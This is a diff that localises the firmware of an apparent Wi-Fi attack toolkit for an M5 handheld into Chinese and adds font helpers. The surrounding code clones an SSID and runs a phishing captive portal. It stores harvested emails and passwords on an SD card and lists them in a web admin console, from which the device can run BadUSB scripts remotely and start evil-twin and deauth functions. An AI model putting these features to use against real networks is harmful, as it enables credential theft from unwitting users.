-  M5.Display.setTextSize(1.5f);                 // <= stable à tous les zooms
+  evilKeepCnFont(M5.Display);
+  evilSetCnFont(M5.Display, 1.5f);                 // <= stable à tous les zooms
   M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
 
   M5.Display.setCursor(5, y + 1);
-  M5.Display.print("Search: ");
+  M5.Display.print("搜索: ");
   M5.Display.print(menuSearchQuery);
 }
 
@@ -2742,8 +2967,8 @@ void drawMenu() {
   // Efface uniquement la zone liste (pas la barre search)
   M5.Display.fillRect(0, MENU_TOP_Y, M5.Display.width(), listH, menuBackgroundColor);
 
-  M5.Display.setTextSize(menuTextSize);
-  M5.Display.setTextFont(1);
+  evilSetCnFont(M5.Display, menuTextSize);
+  evilKeepCnFont(M5.Display);
 
   const int startX = 5;
   const int startY = 10;
@@ -3198,7 +3423,7 @@ void hexToString(const uint8_t* data, size_t length, char* output) {
 void doTheThing() {
   M5.Lcd.fillScreen(BLACK);
   M5.Lcd.setTextColor(GREEN, BLACK);
-  M5.Lcd.setTextSize(1.5);
+  evilSetCnFont(M5.Lcd, 1.5);
   M5.Lcd.setCursor(0, 0);
   char buffer[64];
   for (int i = 0; i < numLines; i++) {
@@ -3216,7 +3441,7 @@ void doTheThing() {
     cardUpdate();
     delay(100);
   }
-  waitAndReturnToMenu("Return to menu");
+  waitAndReturnToMenu("返回主菜单");
 }
 
 
@@ -3284,7 +3509,8 @@ static bool g_jsonOut = false;
 // Lance une fonction du menu par son nom (raccourcis serial : deauth, evil_twin…)
 void runByName(const char* name) {
   for (int i = 0; i < menuSize; i++)
-    if (strcmp((const char*)menuItems[i], name) == 0) {
+    if (strcmp((const char*)menuItems[i], name) == 0 ||
+        strcmp((const char*)menuItemsEn[i], name) == 0) {
       Serial.printf("[RUN] %s\n", name); executeMenuItem(i); Serial.println(F("[RUN] done")); return;
     }
   Serial.printf("Function not found: %s\n", name);
@@ -3907,7 +4133,7 @@ void scanWifiNetworks() {
     M5.Display.clear();
     M5.Display.fillRect(0, M5.Display.height() - 20, M5.Display.width(), 20, TFT_BLACK);
     M5.Display.setCursor(12 , M5.Display.height() / 2 );
-    M5.Display.print("Scan in progress... ");
+    M5.Display.print("正在扫描 WiFi... ");
     Serial.println(F("-------------------"));
     Serial.println(F("WiFi Scan in progress... "));
     M5.Display.display();
@@ -3925,7 +4151,7 @@ void scanWifiNetworks() {
   Serial.println(F("-------------------"));
   Serial.println(F("WiFi Scan Completed "));
   Serial.println(F("-------------------"));
-  waitAndReturnToMenu("Scan Completed");
+  waitAndReturnToMenu("WiFi 扫描完成");
 
 }
 
@@ -3964,14 +4190,13 @@ void showWifiList() {
     }
   };
 
-  auto truncateToWidth = [&](String s, int maxW) {
+  auto truncateToWidth = [&](String s, int maxW) -> String {
     if (maxW <= 0) return String("");
     if (M5.Display.textWidth(s) <= maxW) return s;
     String e = "...";
-    while (s.length() > 0 && M5.Display.textWidth(s + e) > maxW) {
-      s.remove(s.length() - 1);
-    }
-    return String(s + e);
+    int ew = M5.Display.textWidth(e);
+    if (maxW <= ew) return e;
+    return evilUtf8ClipPx(M5.Display, s, maxW - ew) + e;
   };
 
   auto drawScrollbar = [&](int startIndex, int visible, int total) {
@@ -4028,8 +4253,8 @@ void showWifiList() {
       const int lines = LIST_HEIGHT / ROW_H;
       int listStartIndex = clampi(currentListIndex - lines/2, 0, max(0, numSsid - lines));
 
-      M5.Display.setFont(&fonts::Font0);
-      M5.Display.setTextSize(1);
+      evilKeepCnFont(M5.Display);
+      evilSetCnFont(M5.Display, 1);
 
       for (int row = 0; row < lines; ++row) {
         int i = listStartIndex + row;
@@ -4059,10 +4284,10 @@ void showWifiList() {
         int textX = LEFT_PAD + ICON_W;
         int maxTextW = max(0, metaX - textX - 2);
         String line = truncateToWidth(ssidList[i], maxTextW);
-        M5.Display.setTextSize(1.3);
+        evilSetCnFont(M5.Display, 1.3);
         M5.Display.setCursor(textX, y + 1);
         M5.Display.print(line);
-        M5.Display.setTextSize(1);
+        evilSetCnFont(M5.Display, 1);
         
         // Méta
         M5.Display.setCursor(metaX, y + 1);
@@ -4105,7 +4330,7 @@ void showWifiList() {
       Serial.println(F("-------------------"));
       Serial.println("SSID " + ssidList[currentListIndex] + " selected");
       Serial.println(F("-------------------"));
-      waitAndReturnToMenu(ssidList[currentListIndex] + " selected");
+      waitAndReturnToMenu("已选择: " + ssidList[currentListIndex]);
       needsDisplayUpdate = true;
       keyHandledEnter = true;
     }
@@ -4131,42 +4356,42 @@ void showWifiDetails(int networkIndex) {
   auto updateDisplay = [&]() {
     if (networkIndex >= 0 && networkIndex < numSsid) {
       M5.Display.clear();
-      M5.Display.setTextSize(1.5);
+      evilSetCnFont(M5.Display, 1.5);
       int y = 2;
       int x = 0;
 
       // SSID
       M5.Display.setCursor(x, y);
-      M5.Display.println("SSID:" + (ssidList[networkIndex].length() > 0 ? ssidList[networkIndex] : "N/A"));
+      M5.Display.println("名称:" + (ssidList[networkIndex].length() > 0 ? ssidList[networkIndex] : "未知"));
       y += 20;
 
       // Channel
       int channel = WiFi.channel(networkIndex);
       M5.Display.setCursor(x, y);
-      M5.Display.println("Channel:" + (channel > 0 ? String(channel) : "N/A"));
+      M5.Display.println("信道:" + (channel > 0 ? String(channel) : "未知"));
       y += 16;
 
       // Security
       String security = getWifiSecurity(networkIndex);
       M5.Display.setCursor(x, y);
-      M5.Display.println("Security:" + (security.length() > 0 ? security : "N/A"));
+      M5.Display.println("加密:" + (security.length() > 0 ? security : "未知"));
       y += 16;
 
       // Signal Strength
       int32_t rssi = WiFi.RSSI(networkIndex);
       M5.Display.setCursor(x, y);
-      M5.Display.println("Signal:" + (rssi != 0 ? String(rssi) + " dBm" : "N/A"));
+      M5.Display.println("信号:" + (rssi != 0 ? String(rssi) + " dBm" : "未知"));
       y += 16;
 
       // MAC Address
       uint8_t* bssid = WiFi.BSSID(networkIndex);
       String macAddress = bssidToString(bssid);
       M5.Display.setCursor(x, y);
-      M5.Display.println("MAC:" + (macAddress.length() > 0 ? macAddress : "N/A"));
+      M5.Display.println("MAC:" + (macAddress.length() > 0 ? macAddress : "未知"));
       y += 16;
 
-      M5.Display.setCursor(80, 110);
-      M5.Display.println("ENTER:Clone");
+      M5.Display.setCursor(72, 110);
+      M5.Display.println("ENTER:克隆");
       M5.Display.setCursor(20, 110);
       M5.Display.println("<");
       M5.Display.setCursor(M5.Display.width() - 20 , 110);
@@ -4191,7 +4416,7 @@ void showWifiDetails(int networkIndex) {
       if (kp(KEY_ENTER) && !keyHandled) {
         cloneSSIDForCaptivePortal(ssidList[networkIndex]);
         inMenu = true;
-        waitAndReturnToMenu(ssidList[networkIndex] + " Cloned...");
+        waitAndReturnToMenu("已克隆: " + ssidList[networkIndex]);
         drawMenu();
         break; // Sortir de la boucle
       } else if (kp('/') && !keyHandled) {
@@ -4724,7 +4949,7 @@ void createCaptivePortal() {
   // Unified admin dashboard (Basic Auth protected)
 server.on("/evil-menu", HTTP_GET, []() {
   if (!guardAdmin()) return;
-  static const char ADMIN_HTML[] PROGMEM = R"HTML(<!doctype html><html lang=en><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Admin</title><style>:root{--bg0:#0b1020;--bg1:#0f1a33;--card:rgba(255,255,255,.10);--card2:rgba(255,255,255,.14);--txt:#e9eefc;--mut:rgba(233,238,252,.72);--st:rgba(255,255,255,.14);--acc:#4c7dff;--r:16px;--sh:0 18px 60px rgba(0,0,0,.42)}@media(prefers-color-scheme:light){:root{--bg0:#f4f7ff;--bg1:#eef2ff;--card:rgba(255,255,255,.92);--card2:rgba(255,255,255,.98);--txt:#0e1730;--mut:rgba(14,23,48,.66);--st:rgba(14,23,48,.12);--sh:0 18px 60px rgba(14,23,48,.14)}}*{box-sizing:border-box}body{margin:0;min-height:100vh;display:grid;place-items:center;padding:22px;color:var(--txt);font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;background:radial-gradient(1200px 600px at 15% 10%,rgba(76,125,255,.35),transparent 60%),radial-gradient(900px 500px at 85% 20%,rgba(40,215,198,.22),transparent 55%),linear-gradient(160deg,var(--bg0),var(--bg1))}.m{width:100%;max-width:520px;background:linear-gradient(180deg,var(--card2),var(--card));border:1px solid var(--st);border-radius:var(--r);box-shadow:var(--sh);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);overflow:hidden}.h{padding:18px 18px 12px;border-bottom:1px solid var(--st)}.t{margin:0;font-size:18px;letter-spacing:.2px}.s{margin:5px 0 0;font-size:13px;color:var(--mut)}.g{padding:12px;display:grid;gap:10px}a.i{display:flex;justify-content:space-between;align-items:center;gap:12px;padding:12px 12px;border-radius:14px;text-decoration:none;color:var(--txt);background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.10);transition:transform .10s ease,background .15s ease,border-color .15s ease,box-shadow .15s ease;outline:none}a.i:after{content:"›";font-size:20px;opacity:.7;line-height:1}a.i:hover{transform:translateY(-1px);background:rgba(255,255,255,.10);border-color:rgba(255,255,255,.18);box-shadow:0 10px 22px rgba(0,0,0,.22)}a.i:active{transform:translateY(0) scale(.995)}a.i:focus-visible{box-shadow:0 0 0 3px rgba(76,125,255,.35),0 10px 22px rgba(0,0,0,.22);border-color:rgba(76,125,255,.55)}.k{display:flex;flex-direction:column;min-width:0}.l{font-weight:650;font-size:14px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.p{font-size:12px;color:var(--mut);margin-top:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.f{padding:10px 12px 14px;border-top:1px solid var(--st);color:var(--mut);font-size:12px;display:flex;justify-content:space-between;gap:10px;flex-wrap:wrap}@media(max-width:420px){body{padding:16px}.g{padding:10px}.p{display:none}}</style><body><div class=m><div class=h><h2 class=t>Evil Admin Console</h2><p class=s>Quick actions and monitoring</p></div><div class=g><a class=i href=/credentials><span class=k><span class=l>Credentials</span><span class=p>View and manage stored credentials</span></span></a><a class=i href=/uploadhtmlfile><span class=k><span class=l>Upload to SD</span><span class=p>Upload files to the SD card</span></span></a><a class=i href=/check-sd-file><span class=k><span class=l>Browse SD</span><span class=p>List, open, and verify SD contents</span></span></a><a class=i href=/setup-portal><span class=k><span class=l>Setup Portal</span><span class=p>Configure portal settings</span></span></a><a class=i href=/list-badusb-scripts><span class=k><span class=l>Run Script</span><span class=p>List and execute an existing script</span></span></a><a class=i href=/scan-network><span class=k><span class=l>Scan Network</span><span class=p>Fast discovery and inventory</span></span></a><a class=i href=/monitor-status><span class=k><span class=l>Monitor Status</span><span class=p>Resources, uptime, and events</span></span></a><a class=i href=/navigator><span class=k><span class=l>Navigator</span><span class=p>Live screen view and remote control</span></span></a><a class=i href=/ciw><span class=k><span class=l>CIW Zeroclick</span><span class=p>SSID injection testing framework</span></span></a><a class=i href=/tt><span class=k><span class=l>TagTinker ESL</span><span class=p>IR shelf label control and image prep</span></span></a></div><div class=f><span>WebUI v2</span><span>Responsive • Dark mode • Accessible</span></div></div></html>)HTML";
+  static const char ADMIN_HTML[] PROGMEM = R"HTML(<!doctype html><html lang=zh-CN><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Evil 管理后台</title><style>:root{--bg0:#0b1020;--bg1:#0f1a33;--card:rgba(255,255,255,.10);--card2:rgba(255,255,255,.14);--txt:#e9eefc;--mut:rgba(233,238,252,.72);--st:rgba(255,255,255,.14);--acc:#4c7dff;--r:16px;--sh:0 18px 60px rgba(0,0,0,.42)}@media(prefers-color-scheme:light){:root{--bg0:#f4f7ff;--bg1:#eef2ff;--card:rgba(255,255,255,.92);--card2:rgba(255,255,255,.98);--txt:#0e1730;--mut:rgba(14,23,48,.66);--st:rgba(14,23,48,.12);--sh:0 18px 60px rgba(14,23,48,.14)}}*{box-sizing:border-box}body{margin:0;min-height:100vh;display:grid;place-items:center;padding:22px;color:var(--txt);font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;background:radial-gradient(1200px 600px at 15% 10%,rgba(76,125,255,.35),transparent 60%),radial-gradient(900px 500px at 85% 20%,rgba(40,215,198,.22),transparent 55%),linear-gradient(160deg,var(--bg0),var(--bg1))}.m{width:100%;max-width:520px;background:linear-gradient(180deg,var(--card2),var(--card));border:1px solid var(--st);border-radius:var(--r);box-shadow:var(--sh);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);overflow:hidden}.h{padding:18px 18px 12px;border-bottom:1px solid var(--st)}.t{margin:0;font-size:18px;letter-spacing:.2px}.s{margin:5px 0 0;font-size:13px;color:var(--mut)}.g{padding:12px;display:grid;gap:10px}a.i{display:flex;justify-content:space-between;align-items:center;gap:12px;padding:12px 12px;border-radius:14px;text-decoration:none;color:var(--txt);background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.10);transition:transform .10s ease,background .15s ease,border-color .15s ease,box-shadow .15s ease;outline:none}a.i:after{content:"›";font-size:20px;opacity:.7;line-height:1}a.i:hover{transform:translateY(-1px);background:rgba(255,255,255,.10);border-color:rgba(255,255,255,.18);box-shadow:0 10px 22px rgba(0,0,0,.22)}a.i:active{transform:translateY(0) scale(.995)}a.i:focus-visible{box-shadow:0 0 0 3px rgba(76,125,255,.35),0 10px 22px rgba(0,0,0,.22);border-color:rgba(76,125,255,.55)}.k{display:flex;flex-direction:column;min-width:0}.l{font-weight:650;font-size:14px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.p{font-size:12px;color:var(--mut);margin-top:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.f{padding:10px 12px 14px;border-top:1px solid var(--st);color:var(--mut);font-size:12px;display:flex;justify-content:space-between;gap:10px;flex-wrap:wrap}@media(max-width:420px){body{padding:16px}.g{padding:10px}.p{display:none}}</style><body><div class=m><div class=h><h2 class=t>Evil 管理控制台</h2><p class=s>快捷操作与实时状态监控</p></div><div class=g><a class=i href=/credentials><span class=k><span class=l>捕获凭据</span><span class=p>查看和管理已捕获的账号密码</span></span></a><a class=i href=/uploadhtmlfile><span class=k><span class=l>上传文件</span><span class=p>上传文件至 SD 卡目录</span></span></a><a class=i href=/check-sd-file><span class=k><span class=l>浏览 SD 卡</span><span class=p>查看、下载、编辑和删除 SD 卡文件</span></span></a><a class=i href=/setup-portal><span class=k><span class=l>钓鱼门户设置</span><span class=p>配置认证门户名称、密码与模板</span></span></a><a class=i href=/list-badusb-scripts><span class=k><span class=l>运行 BadUSB 脚本</span><span class=p>列出并远程执行 BadUSB 载荷脚本</span></span></a><a class=i href=/scan-network><span class=k><span class=l>内网资产扫描</span><span class=p>快速发现局域网存活主机与端口</span></span></a><a class=i href=/monitor-status><span class=k><span class=l>运行状态监控</span><span class=p>查看系统资源、运行时间与连接状态</span></span></a><a class=i href=/navigator><span class=k><span class=l>远程屏幕控制</span><span class=p>实时屏幕串流与远程虚拟键盘操控</span></span></a><a class=i href=/ciw><span class=k><span class=l>CIW 零点击利用</span><span class=p>SSID 注入漏洞测试控制台</span></span></a><a class=i href=/tt><span class=k><span class=l>TagTinker 电子价签</span><span class=p>红外电子货架标签控制与图像下发</span></span></a></div><div class=f><span>WebUI v2</span><span>响应式 | 深色模式 | 中文界面</span></div></div></html>)HTML";
   server.send_P(200, "text/html", ADMIN_HTML);
 });
 
@@ -4735,24 +4960,24 @@ server.on("/evil-menu", HTTP_GET, []() {
     File file = SD.open("/evil/credentials.txt");
     if (!file) {
       String content;
-      content += F("<p>File not found.</p>");
-      content += F("<div class='actions'><a class='btn' href='/evil-menu'>Back to Dashboard</a></div>");
-      server.send(404, "text/html", wrapAdminPage("Credentials", content));
+      content += F("<p>未找到凭据文件。</p>");
+      content += F("<div class='actions'><a class='btn' href='/evil-menu'>返回控制台</a></div>");
+      server.send(404, "text/html", wrapAdminPage("捕获凭据", content));
       return;
     }
 
     if (file.size() == 0) {
       String content;
-      content += F("<p>No credentials found.</p>");
-      content += F("<div class='actions'><a class='btn' href='/evil-menu'>Back to Dashboard</a></div>");
-      server.send(200, "text/html", wrapAdminPage("Credentials", content));
+      content += F("<p>暂无捕获凭据。</p>");
+      content += F("<div class='actions'><a class='btn' href='/evil-menu'>返回控制台</a></div>");
+      server.send(200, "text/html", wrapAdminPage("捕获凭据", content));
       file.close();
       return;
     }
 
     String content;
     content.reserve(2048);
-    content += F("<div class='scroll-x'><table class='wide'><tr><th>Email</th><th>Password</th><th>Portal</th><th>SSID</th></tr>");
+    content += F("<div class='scroll-x'><table class='wide'><tr><th>账号 / 邮箱</th><th>密码</th><th>门户模板</th><th>SSID</th></tr>");
 
     enum { NONE, EMAIL_NEXT, PASS_NEXT, PORTAL_NEXT, SSID_NEXT } st = NONE;
     String email="", pass="", portal="", ssid="";
@@ -4801,10 +5026,10 @@ server.on("/evil-menu", HTTP_GET, []() {
 
     content += F("</table></div>");
     if (rows == 0) {
-      content += F("<p class='mut'>No entries parsed in credentials file.</p>");
+      content += F("<p class='mut'>凭据文件中未解析到有效记录。</p>");
     }
-    content += F("<div class='actions'><a class='btn' href='/evil-menu'>Back to Dashboard</a></div>");
-    server.send(200, "text/html", wrapAdminPage("Credentials", content));
+    content += F("<div class='actions'><a class='btn' href='/evil-menu'>返回控制台</a></div>");
+    server.send(200, "text/html", wrapAdminPage("捕获凭据", content));
   });
 
 
@@ -4821,7 +5046,7 @@ server.on("/evil-menu", HTTP_GET, []() {
     html += "<!DOCTYPE html><html><head>";
     html += "<meta charset='UTF-8'>";
     html += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
-    html += "<title>Evil File Upload</title>";
+    html += "<title>Evil 文件上传</title>";
 
     html += "<style>";
     html += "body{margin:0;min-height:100vh;display:grid;place-items:center;padding:22px;color:#e9eefc;font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;background:radial-gradient(1200px 600px at 15% 10%,rgba(76,125,255,.35),transparent 60%),radial-gradient(900px 500px at 85% 20%,rgba(40,215,198,.22),transparent 55%),linear-gradient(160deg,#0b1020,#0f1a33);}";
@@ -4848,19 +5073,19 @@ server.on("/evil-menu", HTTP_GET, []() {
     html += "</style></head>";
 
     html += "<body><div class='container'>";
-    html += "<h2>Upload Files</h2>";
+    html += "<h2>上传文件至 SD 卡</h2>";
 
-    html += "<select id='dirSelect'><option value='loading'>Loading...</option></select>";
+    html += "<select id='dirSelect'><option value='loading'>加载目录中...</option></select>";
 
-    html += "<div id='dropZone'>Drag & Drop file here</div>";
+    html += "<div id='dropZone'>将文件拖拽至此区域</div>";
     html += "<input type='file' id='fileInput' multiple>";
     html += "<div id='fileList'></div>";
 
     html += "<div id='progressBar'><div id='progressFill'></div></div>";
-    html += "<div id='doneBox'>✔ Upload complete</div>";
+    html += "<div id='doneBox'>上传已完成</div>";
 
-    html += "<p style='margin:10px 0'><a href='/evil-menu' style='text-decoration:none;color:#007bff'>← Back to Dashboard</a></p>";
-    html += "<button id='uploadBtn'>Upload</button>";
+    html += "<p style='margin:10px 0'><a href='/evil-menu' style='text-decoration:none;color:#007bff'>← 返回管理控制台</a></p>";
+    html += "<button id='uploadBtn'>开始上传</button>";
     html += "</div>";
 
     // JS =================================================================
@@ -4879,7 +5104,7 @@ server.on("/evil-menu", HTTP_GET, []() {
     html += "function addFiles(flist){for(let f of flist){filesToUpload.push(f);}refreshList();}";
 
     // Refresh list
-    html += "function refreshList(){let h='';filesToUpload.forEach((f)=>{h+='• '+f.name+' ('+f.size+' bytes)<br>';});document.getElementById('fileList').innerHTML=h;}";
+    html += "function refreshList(){let h='';filesToUpload.forEach((f)=>{h+='- '+f.name+' ('+f.size+' 字节)<br>';});document.getElementById('fileList').innerHTML=h;}";
 
     // Input
     html += "document.getElementById('fileInput').addEventListener('change',function(){addFiles(this.files);});";
@@ -4892,13 +5117,13 @@ server.on("/evil-menu", HTTP_GET, []() {
 
     // Upload logic FIXED ( pauses + reset + complete message )
     html += "document.getElementById('uploadBtn').addEventListener('click',function(){";
-    html += "if(filesToUpload.length===0){alert('No files selected.');return;}";
+    html += "if(filesToUpload.length===0){alert('请先选择文件。');return;}";
 
     html += "let dir=document.getElementById('dirSelect').value;";
     html += "let i=0;";
 
     html += "function next(){";
-    html += "if(i>=filesToUpload.length){document.getElementById('doneBox').style.display='block';document.getElementById('progressFill').style.width='0%';alert('Upload complete');return;}";
+    html += "if(i>=filesToUpload.length){document.getElementById('doneBox').style.display='block';document.getElementById('progressFill').style.width='0%';alert('上传完成');return;}";
 
     html += "let file=filesToUpload[i];";
     html += "let fd=new FormData();fd.append('file',file);";
@@ -4907,7 +5132,7 @@ server.on("/evil-menu", HTTP_GET, []() {
 
     html += "x.upload.onprogress=function(e){if(e.lengthComputable){let p=(e.loaded/e.total)*100;document.getElementById('progressFill').style.width=p+'%';}};";
 
-    html += "x.onload=function(){if(x.status===200){i++;setTimeout(()=>{document.getElementById('progressFill').style.width='0%';next();},150);}else{alert('Upload failed for '+file.name);}};";
+    html += "x.onload=function(){if(x.status===200){i++;setTimeout(()=>{document.getElementById('progressFill').style.width='0%';next();},150);}else{alert('文件上传失败: '+file.name);}};";
 
     html += "x.send(fd);";
     html += "}";
@@ -4931,23 +5156,23 @@ server.on("/evil-menu", HTTP_GET, []() {
   server.on("/upload-ui", HTTP_GET, []() {
     if (!guardAdmin()) return;
     String content;
-    content += F("<div class='row'><select id='dirSelect'><option value='loading'>Loading...</option></select></div>");
-    content += F("<div id='dropZone'>Drag & Drop file here</div>");
+    content += F("<div class='row'><select id='dirSelect'><option value='loading'>加载目录中...</option></select></div>");
+    content += F("<div id='dropZone'>将文件拖拽至此区域</div>");
     content += F("<input type='file' id='fileInput' multiple>");
     content += F("<div id='fileList'></div>");
     content += F("<div id='progressBar'><div id='progressFill'></div></div>");
-    content += F("<div id='doneBox'>Upload complete</div>");
-    content += F("<div class='actions'><a class='btn p' href='#' id='uploadBtn'>Upload</a></div>");
+    content += F("<div id='doneBox'>上传已完成</div>");
+    content += F("<div class='actions'><a class='btn p' href='#' id='uploadBtn'>开始上传</a></div>");
     content += F("<script>");
     content += F("let filesToUpload=[];\n");
     content += F("fetch('/list-directories').then(r=>r.text()).then(t=>{const s=document.getElementById('dirSelect');s.innerHTML='';t.split('\\n').forEach(d=>{if(d.trim()!==''){let o=document.createElement('option');o.value=d;o.textContent=d;s.appendChild(o);}});});\n");
     content += F("function addFiles(flist){for(let f of flist){filesToUpload.push(f);}refreshList();}\n");
-    content += F("function refreshList(){let h='';filesToUpload.forEach((f)=>{h+='• '+f.name+' ('+f.size+' bytes)<br>';});document.getElementById('fileList').innerHTML=h;}\n");
+    content += F("function refreshList(){let h='';filesToUpload.forEach((f)=>{h+='- '+f.name+' ('+f.size+' 字节)<br>';});document.getElementById('fileList').innerHTML=h;}\n");
     content += F("document.getElementById('fileInput').addEventListener('change',function(){addFiles(this.files);});\n");
     content += F("const drop=document.getElementById('dropZone');drop.addEventListener('dragover',e=>{e.preventDefault();drop.classList.add('dragover');});drop.addEventListener('dragleave',()=>drop.classList.remove('dragover'));drop.addEventListener('drop',e=>{e.preventDefault();drop.classList.remove('dragover');addFiles(e.dataTransfer.files);});\n");
-    content += F("document.getElementById('uploadBtn').addEventListener('click',function(e){e.preventDefault();if(filesToUpload.length===0){alert('No files selected.');return;}let dir=document.getElementById('dirSelect').value;let i=0;function next(){if(i>=filesToUpload.length){document.getElementById('doneBox').style.display='block';document.getElementById('progressFill').style.width='0%';return;}let file=filesToUpload[i];let fd=new FormData();fd.append('file',file);let x=new XMLHttpRequest();x.open('POST','/upload?directory='+encodeURIComponent(dir),true);x.upload.onprogress=function(e){if(e.lengthComputable){let p=(e.loaded/e.total)*100;document.getElementById('progressFill').style.width=p+'%';}};x.onload=function(){if(x.status===200){i++;setTimeout(()=>{document.getElementById('progressFill').style.width='0%';next();},150);}else{alert('Upload failed for '+file.name);}};x.send(fd);}next();});\n");
+    content += F("document.getElementById('uploadBtn').addEventListener('click',function(e){e.preventDefault();if(filesToUpload.length===0){alert('请先选择文件。');return;}let dir=document.getElementById('dirSelect').value;let i=0;function next(){if(i>=filesToUpload.length){document.getElementById('doneBox').style.display='block';document.getElementById('progressFill').style.width='0%';return;}let file=filesToUpload[i];let fd=new FormData();fd.append('file',file);let x=new XMLHttpRequest();x.open('POST','/upload?directory='+encodeURIComponent(dir),true);x.upload.onprogress=function(e){if(e.lengthComputable){let p=(e.loaded/e.total)*100;document.getElementById('progressFill').style.width=p+'%';}};x.onload=function(){if(x.status===200){i++;setTimeout(()=>{document.getElementById('progressFill').style.width='0%';next();},150);}else{alert('文件上传失败: '+file.name);}};x.send(fd);}next();});\n");
     content += F("</script>");
-    server.send(200, "text/html", wrapAdminPage("Upload Files", content));
+    server.send(200, "text/html", wrapAdminPage("文件上传", content));
   });
 
   server.on("/delete-sd-file", HTTP_GET, handleFileDelete);
@@ -4972,14 +5197,14 @@ server.on("/evil-menu", HTTP_GET, []() {
 
       String content;
       content += F("<form action='/update-portal-settings' method='get'>");
-      content += F("<div class='row'><input type='text' name='newSSID' placeholder='SSID / Portal name'><input type='password' name='newPassword' placeholder='Password (optional)'></div>");
+      content += F("<div class='row'><input type='text' name='newSSID' placeholder='SSID / 门户热点名称'><input type='password' name='newPassword' placeholder='热点密码 (留空则为开放网络)'></div>");
       content += F("<div class='row'><select name='portalIndex'>");
       content += portalOptions;
       content += F("</select></div>");
-      content += F("<div class='actions'><button class='btn p' type='submit'>Save Settings</button></div></form>");
-      content += F("<div class='actions'><a class='btn g' href='/start-portal'>Start Portal</a><a class='btn' href='/stop-portal'>Stop Portal</a></div>");
+      content += F("<div class='actions'><button class='btn p' type='submit'>保存设置</button></div></form>");
+      content += F("<div class='actions'><a class='btn g' href='/start-portal'>启动门户</a><a class='btn' href='/stop-portal'>停止门户</a></div>");
 
-      server.send(200, "text/html", wrapAdminPage("Setup Portal", content));
+      server.send(200, "text/html", wrapAdminPage("钓鱼门户设置", content));
       });
   
   
@@ -5019,7 +5244,7 @@ server.on("/evil-menu", HTTP_GET, []() {
       changePortal(portalIndex);
       Serial.println("Portal page updated to index: " + String(portalIndex));
   
-      server.send(200, "text/html", "<html><body><p>Settings updated successfully!</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
+      server.send(200, "text/html", "<html><head><meta charset='UTF-8'></head><body><p>门户设置更新成功！</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
   });
 
 
@@ -5029,13 +5254,13 @@ server.on("/evil-menu", HTTP_GET, []() {
   server.on("/start-portal", HTTP_GET, []() {
       if (!guardAdmin()) return;
       createCaptivePortal();
-      server.send(200, "text/html", "<html><body><p>Portal started successfully!</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
+      server.send(200, "text/html", "<html><head><meta charset='UTF-8'></head><body><p>认证门户已启动！</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
   });
   
   server.on("/stop-portal", HTTP_GET, []() {
       if (!guardAdmin()) return;
       stopCaptivePortal();
-      server.send(200, "text/html", "<html><body><p>Portal stopped successfully!</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
+      server.send(200, "text/html", "<html><head><meta charset='UTF-8'></head><body><p>认证门户已停止！</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
   });
 
 
@@ -5044,7 +5269,7 @@ server.on("/evil-menu", HTTP_GET, []() {
   
       File dir = SD.open("/evil/BadUsbScript");
       if (!dir || !dir.isDirectory()) {
-          server.send(404, "text/html", "<html><body><p>BadUSB script directory not found.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
+          server.send(404, "text/html", "<html><head><meta charset='UTF-8'></head><body><p>未找到 BadUSB 脚本目录。</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
           return;
       }
       String content;
@@ -5056,13 +5281,13 @@ server.on("/evil-menu", HTTP_GET, []() {
               // Show filename with a right-aligned Run button
               content += "<li style='display:flex;align-items:center;justify-content:space-between'>";
               content += "<span>" + fileName + "</span>";
-              content += "<a class='btn p' href='/run-badusb-script?filename=" + fileName + "'>Run</a>";
+              content += "<a class='btn p' href='/run-badusb-script?filename=" + fileName + "'>运行</a>";
               content += "</li>";
           }
           file.close();
       }
       content += F("</ul>");
-      server.send(200, "text/html", wrapAdminPage("BadUSB Scripts", content));
+      server.send(200, "text/html", wrapAdminPage("BadUSB 脚本列表", content));
       dir.close();
 
   });
@@ -5074,9 +5299,9 @@ server.on("/evil-menu", HTTP_GET, []() {
       String scriptName = server.arg("filename");
       if (SD.exists("/evil/BadUsbScript/" + scriptName)) {
           runScript(scriptName);  // Utilise la fonction existante pour exécuter le script
-          server.send(200, "text/html", "<html><body><p>Script " + scriptName + " executed successfully!</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
+          server.send(200, "text/html", "<html><head><meta charset='UTF-8'></head><body><p>脚本 " + scriptName + " 执行完成！</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
       } else {
-          server.send(404, "text/html", "<html><body><p>Script not found.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
+          server.send(404, "text/html", "<html><head><meta charset='UTF-8'></head><body><p>未找到指定脚本。</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
       }
   });
 
@@ -5091,7 +5316,7 @@ server.on("/evil-menu", HTTP_GET, []() {
       // Check if the file exists
       if (!SD.exists(editFileName)) {
           Serial.println("File not found: " + editFileName);
-          server.send(404, "text/html", "<html><body><p>File not found.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
+          server.send(404, "text/html", "<html><head><meta charset='UTF-8'></head><body><p>文件不存在。</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
           return;
       }
   
@@ -5099,14 +5324,14 @@ server.on("/evil-menu", HTTP_GET, []() {
